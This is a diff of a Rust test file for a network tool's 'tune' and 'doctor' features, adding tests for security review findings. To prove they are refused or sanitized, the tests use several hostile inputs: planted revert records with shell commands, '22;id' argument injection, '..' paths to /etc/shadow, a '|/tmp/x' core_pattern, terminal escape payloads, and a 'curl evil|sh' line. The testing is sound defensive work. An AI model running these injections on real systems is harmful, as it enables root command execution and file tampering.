@@ -1078,7 +1078,8 @@ fn revert_leaves_alone_what_someone_changed_since() {
     );
     let plan = plan_of(&sys, &options());
     tune::apply(&sys, &plan, &mut |_| {}).unwrap();
-    sys.write("/etc/sysctl.d/90-qsh.conf", b"# edited\n", 0o644).unwrap();
+    sys.write("/etc/sysctl.d/90-qsh.conf", b"# edited\n", 0o644, None)
+        .unwrap();
     sys.set("/proc/sys/net/core/rmem_max", "8388608\n").unwrap();
     let record = tune::Record::load(&sys).unwrap().unwrap();
     let warnings = tune::revert(&sys, &record, &mut |_| {}).unwrap();
@@ -1131,7 +1132,7 @@ fn tune_opens_ufw_and_reverts_its_files() {
     assert_eq!(sys.ran.borrow().last().map(String::as_str), Some("ufw reload"));
     // Changed since: the rules are deleted with ufw itself
     tune::apply(&sys, &plan, &mut |_| {}).unwrap();
-    sys.write("/etc/ufw/user.rules", b"admin edit\n", 0o644).unwrap();
+    sys.write("/etc/ufw/user.rules", b"admin edit\n", 0o644, None).unwrap();
     let record = tune::Record::load(&sys).unwrap().unwrap();
     let warnings = tune::revert(&sys, &record, &mut |_| {}).unwrap();
     assert_eq!(warnings.len(), 1, "{warnings:?}");
@@ -1316,10 +1317,211 @@ fn the_record_round_trips_and_rejects_other_formats() {
     assert_eq!(tune::Record::from_json(&record.to_json()), Some(record.clone()));
     // The fixture has no /var: tune created it, and its revert removes it
     assert_eq!(record.created_dirs, ["/var", "/var/lib", "/var/lib/qsh"]);
-    sys.write(tune::RECORD, b"{\"qsh_tune\":9}", 0o644).unwrap();
+    sys.write(tune::RECORD, b"{\"qsh_tune\":9}", 0o600, None).unwrap();
     assert!(tune::Record::load(&sys).unwrap_err().contains("unknown format"));
-    sys.write(tune::RECORD, b"not json", 0o644).unwrap();
+    sys.write(tune::RECORD, b"not json", 0o600, None).unwrap();
     assert!(tune::Record::load(&sys).is_err());
+}
+
+/// Review M2: the record holds copies of firewall files (ufw's user.rules is 0640), so it is
+/// 0600 in a 0700 directory; and a revert puts a file back with the mode and owner it had,
+/// not 0644.
+#[test]
+fn the_record_is_private_and_a_revert_keeps_modes_and_owners() {
+    let rules = "*filter\nCOMMIT\n";
+    let added = "*filter\n-A ufw-user-input -p udp --dport 60443:60542 -j ACCEPT\nCOMMIT\n";
+    let sys = ufw_active(root_alice(distro("ubuntu-24.04")))
+        .file("/proc/sys/net/core/rmem_max", "4194304\n")
+        .file("/proc/sys/net/core/wmem_max", "4194304\n")
+        .file("/proc/sys/net/ipv4/tcp_allowed_congestion_control", "reno cubic bbr\n")
+        .file("/etc/ufw/user.rules", rules)
+        .file("/etc/ufw/user6.rules", rules)
+        .cmd("ufw allow 60443:60542/udp comment qsh", 0, "")
+        .effect(
+            "ufw allow 60443:60542/udp comment qsh",
+            "/etc/ufw/user.rules",
+            Some(added),
+        )
+        .cmd("ufw allow 60443:60542/tcp comment qsh", 0, "")
+        .cmd("ufw reload", 0, "");
+    sys.modes
+        .borrow_mut()
+        .insert("/etc/ufw/user.rules".into(), (0o640, 0, 4));
+    sys.modes
+        .borrow_mut()
+        .insert("/etc/ufw/user6.rules".into(), (0o640, 0, 4));
+    let plan = plan_of(&sys, &options());
+    tune::apply(&sys, &plan, &mut |_| {}).unwrap();
+    let mode = |p: &str| System::meta(&sys, p).map(|m| (m.mode, m.uid, m.gid));
+    assert_eq!(mode(tune::RECORD), Some((0o600, 0, 0)));
+    assert_eq!(mode("/var/lib/qsh"), Some((0o700, 0, 0)));
+    assert!(
+        sys.read(tune::RECORD).unwrap().contains("*filter"),
+        "a copy of the rules"
+    );
+    // The tool rewrote the file (the fake leaves the mode the fixture gave it)
+    let record = tune::Record::load(&sys).unwrap().unwrap();
+    tune::revert(&sys, &record, &mut |_| {}).unwrap();
+    assert_eq!(sys.read("/etc/ufw/user.rules").as_deref(), Some(rules));
+    assert_eq!(mode("/etc/ufw/user.rules"), Some((0o640, 0, 4)));
+}
+
+/// A valid record, as JSON, from applying the default plan on an Ubuntu fixture.
+fn record_json(sys: &Fake) -> Value {
+    tune::apply(sys, &plan_of(sys, &options()), &mut |_| {}).unwrap();
+    serde_json::from_str(&sys.read(tune::RECORD).unwrap()).unwrap()
+}
+
+/// Review H3: the record decides what `--revert` runs and writes as root. A record that tune
+/// could not have written is refused as a whole, before anything is shown or done: another
+/// program or argument, a path outside tune's own files (`..` included), a sysctl tune does
+/// not set (or with a `/` in its name), a module other than tcp_bbr; and a record or directory
+/// that someone other than root could have written.
+#[test]
+fn records_tune_did_not_write_are_refused() {
+    let base = || with_modprobe(root_alice(distro("ubuntu-24.04"))).dir("/var/lib/qsh");
+    let sys = base();
+    let valid = record_json(&sys);
+    assert!(tune::Record::load(&sys).unwrap().is_some());
+    let file = |path: &str| json!({"kind":"file","path":path,"before":null,"sha256":null,"fixes":["udp-buffers"],"created_dirs":[]});
+    let commands = |fix: &str, run: Value, files: Value, reload: Value| {
+        let files: Vec<Value> = files
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|p| json!({"path":p,"before":null,"sha256":null}))
+            .collect();
+        json!({"kind":"commands","fix":fix,"run":run,"undo":run,"files":files,"reload":reload})
+    };
+    let planted: Vec<(&str, Value)> = vec![
+        (
+            "a shell",
+            commands(
+                "firewall",
+                json!([["sh", "-c", "touch /pwned"]]),
+                json!([]),
+                Value::Null,
+            ),
+        ),
+        (
+            "ufw reset",
+            commands(
+                "firewall",
+                json!([["ufw", "--force", "reset"]]),
+                json!(["/etc/ufw/user.rules", "/etc/ufw/user6.rules"]),
+                json!(["ufw", "reload"]),
+            ),
+        ),
+        (
+            "a ufw rule with a shell word",
+            commands(
+                "firewall",
+                json!([["ufw", "allow", "22;id", "comment", "qsh"]]),
+                json!(["/etc/ufw/user.rules", "/etc/ufw/user6.rules"]),
+                json!(["ufw", "reload"]),
+            ),
+        ),
+        (
+            "ufw with other files",
+            commands(
+                "firewall",
+                json!([["ufw", "allow", "22", "comment", "qsh"]]),
+                json!(["/etc/shadow", "/etc/ufw/user6.rules"]),
+                json!(["ufw", "reload"]),
+            ),
+        ),
+        (
+            "a zone with a path",
+            commands(
+                "firewall",
+                json!([["firewall-cmd", "--permanent", "--zone=../../x", "--add-service=qsh"]]),
+                json!([
+                    "/etc/firewalld/zones/../../x.xml",
+                    "/etc/firewalld/zones/../../x.xml.old"
+                ]),
+                json!(["firewall-cmd", "--reload"]),
+            ),
+        ),
+        (
+            "linger for an option",
+            commands(
+                "linger",
+                json!([["loginctl", "enable-linger", "--help"]]),
+                json!([]),
+                Value::Null,
+            ),
+        ),
+        ("an escaping path", file("/../../victim.txt")),
+        ("a path through ..", file("/etc/sysctl.d/../../victim.txt")),
+        ("another file", file("/etc/passwd")),
+        (
+            "a sysctl with a slash",
+            json!({"kind":"sysctl","fix":"udp-buffers","key":"net/../../../etc/shadow","before":"1","after":"2"}),
+        ),
+        (
+            "a sysctl tune does not set",
+            json!({"kind":"sysctl","fix":"udp-buffers","key":"kernel.core_pattern","before":"core","after":"|/tmp/x"}),
+        ),
+        (
+            "a sysctl value with a pipe",
+            json!({"kind":"sysctl","fix":"udp-buffers","key":"net.core.rmem_max","before":"|/tmp/x","after":"4194304"}),
+        ),
+        ("another module", json!({"kind":"module","fix":"tcp-bbr","name":"evil"})),
+    ];
+    for (what, change) in planted {
+        let sys = base();
+        let mut record = valid.clone();
+        record["changes"].as_array_mut().unwrap().push(change);
+        sys.write(tune::RECORD, record.to_string().as_bytes(), 0o600, None)
+            .unwrap();
+        let error = tune::Record::load(&sys).unwrap_err();
+        assert!(error.contains("did not write"), "{what}: {error}");
+        // The command refuses too, and runs nothing
+        let host = HostInfo::read(&sys);
+        let ran = sys.ran.borrow().len();
+        let mut out = Vec::new();
+        let request = Request {
+            apply: false,
+            revert: true,
+            yes: true,
+            options: options(),
+        };
+        assert_eq!(
+            tune::command(&sys, &host, &sudo_alice(), &request, false, &mut |_| None, &mut out),
+            1,
+            "{what}"
+        );
+        assert_eq!(
+            sys.ran.borrow().len(),
+            ran,
+            "{what}: ran {:?}",
+            &sys.ran.borrow()[ran..]
+        );
+    }
+    let mut record = valid.clone();
+    record["created_dirs"] = json!(["/home/alice"]);
+    let sys = base();
+    sys.write(tune::RECORD, record.to_string().as_bytes(), 0o600, None)
+        .unwrap();
+    assert!(tune::Record::load(&sys).is_err(), "a directory tune does not create");
+    // Who could have written it
+    for (mode, owner, why) in [
+        (0o666, None, "writable by group or others"),
+        (0o620, None, "writable by group or others"),
+        (0o600, Some((1000, 1000)), "belongs to another user"),
+    ] {
+        let sys = base();
+        sys.write(tune::RECORD, valid.to_string().as_bytes(), mode, owner)
+            .unwrap();
+        let error = tune::Record::load(&sys).unwrap_err();
+        assert!(error.contains(why), "{error}");
+    }
+    let sys = base();
+    record_json(&sys);
+    sys.modes.borrow_mut().insert("/var/lib/qsh".into(), (0o777, 0, 0));
+    assert!(tune::Record::load(&sys)
+        .unwrap_err()
+        .contains("/var/lib/qsh is writable"));
 }
 
 // ---------------------------------------------------------------------------------------
@@ -1407,4 +1609,130 @@ fn diagnoses_combine_both_sides() {
     assert!(d[2].starts_with("the ssh pipe fails"), "{d:?}");
     let d = diagnose("web1", &[probe(Transport::Ssh, 0, None)], &Remote::Old);
     assert!(d[0].contains("has no doctor (before 0.5.0)"), "{d:?}");
+}
+
+/// Review M5: `qsh doctor HOST` opened every probe at once (up to 18 unauthenticated
+/// connections) while the daemon admits 8 per source; the refused ones were recorded as the
+/// network blocking TLS. At most PROBES_AT_ONCE run at a time now.
+#[tokio::test]
+async fn probes_stay_within_the_daemons_limit_per_source() {
+    use super::client::{at_most, PROBES_AT_ONCE};
+    use std::sync::atomic::{AtomicUsize, Ordering};
+    use std::sync::Arc;
+    let (now, most) = (Arc::new(AtomicUsize::new(0)), Arc::new(AtomicUsize::new(0)));
+    type Job = std::pin::Pin<Box<dyn std::future::Future<Output = usize> + Send>>;
+    let jobs: Vec<Job> = (0..18usize)
+        .map(|i| {
+            let (now, most) = (now.clone(), most.clone());
+            Box::pin(async move {
+                let n = now.fetch_add(1, Ordering::SeqCst) + 1;
+                most.fetch_max(n, Ordering::SeqCst);
+                tokio::time::sleep(std::time::Duration::from_millis(20)).await;
+                now.fetch_sub(1, Ordering::SeqCst);
+                i
+            }) as Job
+        })
+        .collect();
+    let out = at_most(jobs, PROBES_AT_ONCE).await;
+    assert_eq!(out, (0..18).collect::<Vec<_>>(), "every result, in order");
+    assert_eq!(most.load(Ordering::SeqCst), PROBES_AT_ONCE);
+}
+
+/// Review L2: `qsh doctor HOST --tune` runs sudo only on a qsh-server that root owns, in
+/// directories only root can change; never on one the user (or anyone but root) could replace,
+/// like `~/.local/bin/qsh-server`.
+#[test]
+fn tune_over_ssh_runs_sudo_only_on_a_program_root_controls() {
+    use std::os::unix::fs::PermissionsExt;
+    let dir = std::env::temp_dir().join(format!("qsh-tune-remote-{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(&dir);
+    let (bin, home) = (dir.join("bin"), dir.join("home"));
+    std::fs::create_dir_all(home.join(".local/bin")).unwrap();
+    std::fs::create_dir_all(&bin).unwrap();
+    let script = |path: &std::path::Path, text: &str| {
+        std::fs::write(path, text).unwrap();
+        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
+    };
+    script(&bin.join("sudo"), "#!/bin/sh\necho \"sudo $*\"\n");
+    let run = |path: &str| {
+        let out = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(super::client::TUNE_REMOTE)
+            .env_clear()
+            .env("PATH", path)
+            .env("HOME", &home)
+            .output()
+            .unwrap();
+        (
+            out.status.code(),
+            String::from_utf8_lossy(&out.stdout).into_owned(),
+            String::from_utf8_lossy(&out.stderr).into_owned(),
+        )
+    };
+    let path = format!("{}:/usr/bin:/bin", bin.display());
+    // None at all
+    assert_eq!(run(&path).0, Some(42));
+    // The user's own copy: refused, with the way out
+    if qsh_core::sys::euid() != 0 {
+        script(&home.join(".local/bin/qsh-server"), "#!/bin/sh\necho mine\n");
+        let (code, out, err) = run(&path);
+        assert_eq!(code, Some(43), "{out} {err}");
+        assert!(!out.contains("sudo"), "{out}");
+        assert!(err.contains("install qsh-server for the whole system"), "{err}");
+        std::fs::remove_file(home.join(".local/bin/qsh-server")).unwrap();
+    }
+    // A root-owned program in root's directories (here env(1), through a link on PATH): run
+    // by its real path
+    let env = ["/usr/bin/env", "/bin/env"]
+        .into_iter()
+        .find(|p| std::path::Path::new(p).exists())
+        .unwrap();
+    let real = std::fs::canonicalize(env).unwrap();
+    std::os::unix::fs::symlink(&real, bin.join("qsh-server")).unwrap();
+    let (code, out, err) = run(&path);
+    assert_eq!(code, Some(0), "{out} {err}");
+    assert_eq!(out.trim(), format!("sudo -- {} tune --apply", real.display()));
+    let _ = std::fs::remove_dir_all(dir);
+}
+
+/// Review L3 (doctor): the remote report is the server's; every string of it reaches the
+/// terminal as text only, and ssh's output is read within a size and a time limit.
+#[test]
+fn the_remote_report_is_text_only_and_bounded() {
+    let line = json!({
+        "doctor": 1,
+        "host": {"name": "web\u{1b}]0;owned\u{7}1", "os_name": "Linux\u{1b}[8m hidden"},
+        "checks": [{"id": "firewall", "status": "fail",
+                    "summary": "blocked\u{1b}]52;c;Y3VybCB4fHNo\u{7}",
+                    "fix": {"root": true, "commands": ["sudo ufw allow 60443\u{1b}[8m; curl evil|sh"]}}]
+    })
+    .to_string();
+    let Remote::Report(r) = parse_remote(Some(0), &format!("motd\n{line}\n"), "") else {
+        panic!("a report")
+    };
+    let text = r.to_string();
+    assert!(!text.contains('\u{1b}') && !text.contains('\u{7}'), "{text}");
+    assert_eq!(r["host"]["name"], "web1");
+    assert_eq!(
+        r["checks"][0]["fix"]["commands"][0],
+        "sudo ufw allow 60443; curl evil|sh"
+    );
+    let Remote::Error(e) = parse_remote(Some(255), "", "\u{1b}[2Jno route") else {
+        panic!("an error")
+    };
+    assert_eq!(e, "ssh failed: no route");
+
+    let mut big = std::process::Command::new("sh");
+    big.args(["-c", "head -c 3000000 /dev/zero | tr '\\0' x; echo done >&2"]);
+    let out = super::system::run_capped(big, std::time::Duration::from_secs(20), 1 << 20, 1024).unwrap();
+    assert_eq!(
+        (out.status, out.stdout.len(), out.stderr.as_str()),
+        (0, 1 << 20, "done\n")
+    );
+    let mut slow = std::process::Command::new("sleep");
+    slow.arg("30");
+    let started = std::time::Instant::now();
+    let out = super::system::run_capped(slow, std::time::Duration::from_millis(200), 1024, 1024).unwrap();
+    assert_eq!(out.status, -1);
+    assert!(started.elapsed() < std::time::Duration::from_secs(10));
 }
